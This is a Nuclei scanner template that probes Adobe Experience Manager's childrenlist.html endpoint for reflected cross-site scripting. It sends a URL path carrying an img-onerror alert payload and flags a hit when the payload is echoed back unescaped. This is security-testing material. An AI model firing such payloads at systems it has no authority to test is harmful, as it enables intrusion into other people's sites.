id: aem-xss

info:
  name: aem-xss.yaml
  author: theabhinavgaur
  severity: medium
  tags: aem-xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/Test nuclei <img src=x data'a'onerror=alert(domain)>.childrenlist.html"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - <img src="x" data onerror="alert(domain)"/>
